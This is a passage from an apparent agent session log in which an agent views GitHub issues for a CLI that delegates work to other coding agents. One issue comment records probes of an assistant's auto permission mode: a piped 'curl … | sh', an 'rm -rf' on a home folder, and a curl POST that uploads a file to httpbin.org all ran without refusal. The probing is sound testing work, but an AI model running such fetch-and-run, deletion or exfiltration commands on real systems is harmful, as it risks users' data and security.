s, the code review notes, the multi-backend idea doc, and the Codex plugin manifest.\n- Host profile moves to `~/.config/delegate/` with the `DELEGATE_HOST_PROFILE` override; profile fields `promptPreamble`, `verifyCommands`, `requiredDeny`, `deadlineMs` are gone.\n- Status records live in `$TMPDIR/delegate-jobs/`.\n- Setup builds the release binary, installs `delegate` on PATH, and moves an existing old profile to the new location.\n- The Claude plugin is renamed to `delegate` and ships only the skill. Version 1.0.0. README rewritten for the CLI.\n\n## Acceptance criteria\n\n- [ ] No MCP code or old-name references remain outside git history.\n- [ ] Setup on this machine installs `delegate` on PATH and moves the old profile.\n- [ ] All tests, clippy and the format check pass.\n\n## Blocked by\n\n- #12 Latency and supervisor-memory budgets\n","stderr":"","executionTime":1802,"interleavedOutput":"title:\tContract: remove MCP and rename to delegate\nstate:\tOPEN\nauthor:\tuser (Amogh Akshintala)\nlabels:\tready-for-agent\ncomments:\t0\nassignees:\t\nprojects:\t\nmilestone:\t\nissue-type:\t\nparent:\t\nsub-issues:\t\nsub-issues-completed:\t\nblocked-by:\tuser/delegate#12\nblocking:\tuser/delegate#15, user/delegate#14\nnumber:\t13\n--\n## Parent\n\n#4\n\n## What to build\n\nThe contract step: the CLI is the only interface, under the name `delegate`.\n\n- Remove the MCP server and everything only it used: the protocol loop, tool schemas, progress notifications, argument validation, the in-memory job registry, the old binary.\n- Remove the parity snapshot, the old reproduction spec, the July/August plans and specs, the code review notes, the multi-backend idea doc, and the Codex plugin manifest.\n- Host profile moves to `~/.config/delegate/` with the `DELEGATE_HOST_PROFILE` override; profile fields `promptPreamble`, `verifyCommands`, `requiredDeny`, `deadlineMs` are gone.\n- Status records live in `$TMPDIR/delegate-jobs/`.\n- Setup builds the release binary, installs `delegate` on PATH, and moves an existing old profile to the new location.\n- The Claude plugin is renamed to `delegate` and ships only the skill. Version 1.0.0. README rewritten for the CLI.\n\n## Acceptance criteria\n\n- [ ] No MCP code or old-name references remain outside git history.\n- [ ] Setup on this machine installs `delegate` on PATH and moves the old profile.\n- [ ] All tests, clippy and the format check pass.\n\n## Blocked by\n\n- #12 Latency and supervisor-memory budgets\n","localExecutionTimeMs":1187},"isBackground":false},"description":"View GitHub issue #13"},"hookAdditionalContexts":[],"toolCallId":"tool_3e4c77d5-c7e2-445e-ad31-e9f2d78c561","startedAtMs":"1790845451729","completedAtMs":"1790845453760"},"model_call_id":"e585ae89-c308-48e6-a816-313689ff8cab-0-gxxy","session_id":"7bb334b3-f226-467c-b3bf-a467f772d57f","timestamp_ms":1790845453725}
{"type":"tool_call","subtype":"completed","call_id":"tool_fca866d8-f4d2-4eae-9395-d1e67484877","tool_call":{"shellToolCall":{"args":{"command":"cd /Users/user/work/delegate-fixtures && gh issue view 4 --comments","workingDirectory":"","timeout":30000,"toolCallId":"tool_fca866d8-f4d2-4eae-9395-d1e67484877","simpleCommands":["cd","gh"],"hasInputRedirect":false,"hasOutputRedirect":false,"parsingResult":{"parsingFailed":false,"executableCommands":[{"name":"cd","args":[{"type":"word","value":"/Users/user/work/delegate-fixtures"}],"fullText":"cd /Users/user/work/delegate-fixtures"},{"name":"gh","args":[{"type":"word","value":"issue"},{"type":"word","value":"view"},{"type":"number","value":"4"},{"type":"word","value":"--comments"}],"fullText":"gh issue view 4 --comments"}],"hasRedirects":false,"hasCommandSubstitution":false,"redirects":[]},"fileOutputThresholdBytes":"40000","isBackground":false,"skipApproval":false,"timeoutBehavior":"TIMEOUT_BEHAVIOR_BACKGROUND","hardTimeout":86400000,"description":"View issue #4 spec and comments","closeStdin":true,"conversationId":"7bb334b3-f226-467c-b3bf-a467f772d57f","adminCommandDenylist":[],"requestId":"e585ae89-c308-48e6-a816-313689ff8cab"},"result":{"success":{"command":"cd /Users/user/work/delegate-fixtures && gh issue view 4 --comments","workingDirectory":"","exitCode":0,"signal":"","stdout":"author:\tuser\nassociation:\towner\nedited:\ttrue\nstatus:\tnone\n--\n## Probe findings from #6 (2026-10-01)\n\nPR: #18. Fixtures: `tests/fixtures/{cursor,pi,claude}/*.stdout` recorded with `scripts/record.sh` (cursor-agent 2026.09.28, pi 0.99.2, claude 2.1.286; models composer-2.5, openai-codex/gpt-6-luna, claude-sonnet-5-5). Each fixture has `.argv` and `.stderr` beside it.\n\n### Does headless Claude in plan mode answer, or propose a plan?\n\nIt depends on the prompt.\n\n- A question or a review gets a direct answer. `claude/plan-plain-answer` returns `391`. `claude/plan-review` runs a read-only `Bash cat` and returns its findings. Both end `STATUS: DONE`.\n- An edit request gets no edit. `claude/plan-edit-request` reads the files, writes a plan to `~/.claude/plans/*.md` (outside cwd), and ends: \"Turn plan mode off, or tell me to proceed, and I'll do it. STATUS: NEEDS_CONTEXT\". The tree was unchanged.\n- `permission_denials` is `[]` in every run. No ExitPlanMode call appears in the stream.\n\n**Decision for #17: keep `--permission-mode plan` for read-only Claude. No fallback.** It answers read-only work and refuses edits by ending NEEDS_CONTEXT, which resume handles (`--capability read-write`). A `--disallowedTools Edit,Write,…` fallback would block plan-file writes but not Bash, so it is weaker. Not tested: whether plan mode blocks a writing Bash command.\n\n### How often does auto mode refuse, and what does a refusal look like?\n\n0 refusals in 3 probes, with `permissionMode: \"auto\"` confirmed in each `system/init` event:\n\n- `claude/auto-refusal`: `curl -s https://example.com | sh` ran (it failed on HTML). For `rm -rf ~/Downloads/old-builds`, the model checked with `ls` first; the directory was absent.\n- `claude/auto-refusal-exfil`: `curl -X POST --data-binary @calc.py https://httpbin.org/post` ran and the POST succeeded.\n\nNo refusal was captured, so its stream shape is still unknown. The likely shape is a `tool_result` with `is_error: true` plus an entry in the result line's `permission_denials`. The parser should surface `permission_denials` when it is non-empty.\n\nA delegated Claude also loads the user's global instructions. In `claude/auto-fix` it committed the fix on a new branch (`fix-add-operator`) and left the tree clean. The change-set must count commits, not only dirty files.\n\n### Does `--session-id` create the session, and does a second run continue it?\n\nYes, for both pi and Claude.\n\n- **pi:** a first use prints `Warning: No project session found with id '<id>'; creating a new session with that id.` on stderr and exits 0. The second run with the same id (`pi/resume-answer`) prints no warning, and the model answers `392` (previous answer + 1). The `session` header line carries the id.\n- **claude:** `--session-id <uuid>` on the first run, then `--resume <uuid>` (`claude/resume-answer`) answers `392`. The result line keeps the same `session_id`. Untested: reusing `--session-id` on an existing session; the spec uses `--resume`.\n- **cursor:** `--resume <session_id from the result line>` (`cursor/resume-answer`) answers `392`.\n\n### Errors\n\n- **cursor** (`cursor/error-bad-model`): exits 1 with empty stdout. stderr holds the message and the list of valid models.\n- **pi** (`pi/error-bad-model`): **exits 0**. stderr warns `Model \"no-such-model\" not found … Using custom model id.` The stream ends normally with `agent_end`, whose last message has `stopReason: \"error\"` and `errorMessage: \"Codex error: The 'no-such-model' model is not supported …\"`. The parser must read `stopReason`, not the exit code.\n- **claude** (`claude/error-bad-model`): exits 1. stdout has a `result` line with `subtype: \"success\"`, `is_error: true` and the message in `result`. stderr has `[claude-code:unrecognized_model]`. The parser must read `is_error`, not `subtype`.\n\n### Cancelled (SIGTERM to the CLI)\n\nAll three backends exit 143 and stop mid-stream (`*/cancelled`). No `result` or `agent_end` line is written. The supervisor marks CANCELLED itself; nothing in the stream says so.\n\n### NEEDS_CONTEXT\n\nAll three backends end with a question and `STATUS: NEEDS_CONTEXT` in the final text (`*/needs-context`). In a first attempt, cursor searched widely before asking (its own transcript store, `env`, a filesystem glob), which produced a 960KB stream that held the user's MCP tool descriptors. The committed fixture was re-recorded with \"do not search, ask me\".\n\n### Redaction\n\nRaw streams carry the recording user's setup: pi's system-prompt `sections` and extension `toolsAdded`, and Claude's `system/init` lists and `hook_response` output. `scripts/redact.jq` blanks these and keeps the event shapes. `record.sh` applies it and replaces the home-directory name. Any live test that records fixtures (#17 and the per-backend live tests) must use the same filter.\n\n### Cost and usage\n\n- **claude:** `total_cost_usd` on the result line.\n- **cursor:** the result line has `usage` with `inputTokens`, `outputTokens`, `cacheReadTokens` and `cacheWriteTokens`, and no cost.\n- **pi:** `usage.cost` appears on messages. The `agent_end` last-message cost (`$0.00016` in `pi/tool-calls-fix`) looks per-message. #16 should verify whether the run total needs summing over `message_end` events.\n\n### Stream noise the parsers must skip\n\n- **claude:** `system/hook_started`, `system/hook_response` (4 of them from user hooks), `system/commands_changed` and `rate_limit_event` arrive before the assistant turn.\n- **pi:** `entry_appended` and `turn_*`, and a final `agent_settled` after `agent_end`.\n- **cursor:** `thinking/delta` and `thinking/completed`.\n\n\n--\n","stderr":"","executionTime":1994,"interleavedOutput":"author:\tuser\nassociation:\towner\nedited:\ttrue\nstatus:\tnone\n--\n## Probe findings from #6 (2026-10-01)\n\nPR: #18. Fixtures: `tests/fixtures/{cursor,pi,claude}/*.stdout` recorded with `scripts/record.sh` (cursor-agent 2026.09.28, pi 0.99.2, claude 2.1.286; models composer-2.5, openai-codex/gpt-6-luna, claude-sonnet-5-5). Each fixture has `.argv` and `.stderr` beside it.\n\n### Does headless Claude in plan mode answer, or propose a plan?\n\nIt depends on the prompt.\n\n- A question or a review gets a direct answer. `claude/plan-plain-answer` returns `391`. `claude/plan-review` runs a read-only `Bash cat` and returns its findings. Both end `STATUS: DONE`.\n- An edit request gets no edit. `claude/plan-edit-request` reads the files, writes a plan to `~/.claude/plans/*.md` (outside cwd), and ends: \"Turn plan mode off, or tell me to proceed, and I'll do it. STATUS: NEEDS_CONTEXT\". The tree was unchanged.\n- `permission_den